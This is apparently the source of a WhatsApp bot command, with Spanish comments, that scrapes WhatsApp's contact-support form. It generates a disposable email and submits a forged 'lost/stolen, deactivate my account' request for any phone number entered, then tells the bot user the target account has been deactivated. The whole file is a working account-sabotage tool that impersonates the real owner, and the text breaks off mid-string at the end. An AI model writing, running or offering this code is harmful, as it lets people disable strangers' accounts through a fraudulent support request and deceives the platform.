import cheerio from 'cheerio';
import axios from 'axios';
import util from 'util';

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
    console.log(`Ejecutando comando: ${command}, Args:`, args);

    // Verificar si el usuario ingresó un número válido
    if (!args || args.length === 0 || !args[0]) {
        console.log("❌ Error: No se ingresó un número válido.");
        return m.reply('[⁉️] Ingrese el número en formato internacional. Ejemplo: +1 (890) 555-555');
    }

    const q = args.join(" ");
    console.log("📞 Número ingresado:", q);

    m.reply("🔄 Procesando solicitud...");

    try {
        console.log("🔄 Obteniendo datos de WhatsApp...");
        let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/", {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.whatsapp.com/",
            }
        });
        console.log("✅ Respuesta de WhatsApp obtenida.");

        console.log("🔄 Generando correo temporal...");
        let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
        console.log("✅ Correo generado:", email.data[0]);

        let cookie = ntah.headers["set-cookie"]?.join("; ") || "";
        console.log("🍪 Cookies obtenidas:", cookie);

        let $ = cheerio.load(ntah.data);
        let $form = $("form");
        if (!$form.length) {
            throw '❌ No se encontró el formulario de WhatsApp';
        }

        let url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        let form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val() || "");
        form.append("lsd", $form.find("input[name=lsd]").val() || "");
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", q);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta: " + q);
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        console.log("📤 Enviando solicitud a WhatsApp...");
        let res = await axios({
            url,
            method: "POST",
            data: form.toString(),
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.whatsapp.com/",
                "Cookie": cookie,
                "Content-Type": "application/x-www-form-urlencoded"
            }
        });

        console.log("🔍 Headers de respuesta:", res.headers);
        console.log("📜 Código de estado:", res.status);
        console.log("📩 Cuerpo de respuesta:", res.data);

        let payload = String(res.data).replace("for (;;);", "");
        console.log("📥 Respuesta de WhatsApp:", payload);

        let jsonResponse;
        try {
            jsonResponse = JSON.parse(payload);
        } catch (e) {
            console.error("❌ Error al procesar la respuesta JSON:", e);
            throw 'Error procesando la respuesta del servidor';
        }

        if (jsonResponse.payload === true) {
            m.reply(`❕𝗗𝗘𝗦𝗔𝗖𝗧𝗜𝗩𝗔𝗡𝗗𝗢❕\n\n##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la27